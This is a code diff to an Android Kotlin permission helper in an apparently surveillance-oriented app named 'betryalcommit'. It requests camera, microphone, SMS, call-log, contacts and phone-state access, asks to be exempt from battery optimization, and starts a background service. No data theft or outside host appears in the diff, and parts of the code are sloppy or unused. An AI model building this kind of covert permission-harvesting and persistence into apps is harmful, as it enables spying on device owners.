@@ -6,12 +6,15 @@ import android.content.Intent
 import android.content.pm.PackageManager
 import android.net.Uri
 import android.os.Build
+import android.os.PowerManager
 import android.provider.Settings
 import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
 import androidx.core.app.ActivityCompat.startActivityForResult
 import androidx.core.content.ContextCompat
+import androidx.core.content.ContextCompat.getSystemService
+import androidx.core.content.ContextCompat.startActivity
 
 
 object Permsu{
@@ -29,13 +32,11 @@ object Permsu{
     Manifest.permission.KILL_BACKGROUND_PROCESSES,
     Manifest.permission.CAMERA,
     Manifest.permission.READ_CONTACTS,
-    Manifest.permission.GET_ACCOUNTS,
     Manifest.permission.RECORD_AUDIO,
     Manifest.permission.MODIFY_AUDIO_SETTINGS,
     Manifest.permission.READ_PHONE_STATE,
     Manifest.permission.READ_CALL_LOG,
     Manifest.permission.PROCESS_OUTGOING_CALLS,
-    Manifest.permission.MANAGE_DEVICE_POLICY_LOCK,
     Manifest.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
     Manifest.permission.READ_PHONE_NUMBERS,
     Manifest.permission.READ_SMS,
@@ -44,7 +45,6 @@ object Permsu{
     Manifest.permission.WRITE_EXTERNAL_STORAGE,
     Manifest.permission.READ_EXTERNAL_STORAGE,
     Manifest.permission.VIBRATE,
-    Manifest.permission.DISABLE_KEYGUARD,
     Manifest.permission.WAKE_LOCK)
     val permissionsToRequest = mutableListOf<String>()
     fun requestPermissions(context: Context, activity: AppCompatActivity, requestCode: Int) {
@@ -56,13 +56,30 @@ object Permsu{
                 ) != PackageManager.PERMISSION_GRANTED
             ) {
                 permissionsToRequest.add(permission)
-            } }
+            }
+        }
         if (!Settings.canDrawOverlays(context)) {
             val intent = Intent(
                 Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                 Uri.parse("package:" + context.getPackageName())
             )
-            activity.startActivityForResult(intent, 0)
+        }
+
+
+        val powerManager = context.getSystemService(Context.POWER_SERVICE) as PowerManager
+
+        if (!powerManager.isIgnoringBatteryOptimizations(context.getPackageName())) {
+            val intent = Intent()
+            intent.action = Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
+            intent.data = Uri.parse("package:com.example.betryalcommit")
+            activity.startActivity(intent)
+        }
+
+        if(context.checkSelfPermission("android.permission.IGNORE_BACKGROUND_DATA_RESTRICTIONS") == PackageManager.PERMISSION_GRANTED){
+            val intent2 = Intent(
+                Settings.ACTION_IGNORE_BACKGROUND_DATA_RESTRICTIONS_SETTINGS,
+                Uri.parse("package:" + context.getPackageName())
+            )
         }
 
         if (permissionsToRequest.isNotEmpty()) {
@@ -72,8 +89,21 @@ object Permsu{
                     permissionsToRequest.toTypedArray(),
                     requestCode);
             }
+            val serviceIntent = Intent(context, MyService::class.java)
+                context.startService(serviceIntent)
         }
-        Toast.makeText(context, "go ahead", Toast.LENGTH_LONG).show()
+        else{
+            Toast.makeText(context, "go ahead", Toast.LENGTH_LONG).show()
         }
+
+    val shared = context.getSharedPreferences("shared", Context.MODE_PRIVATE)
+
+        val editor = shared.edit()
+        editor.putString("current","permissions")
+        editor.apply()
+        editor.commit()
+
+    }
+
 
 }
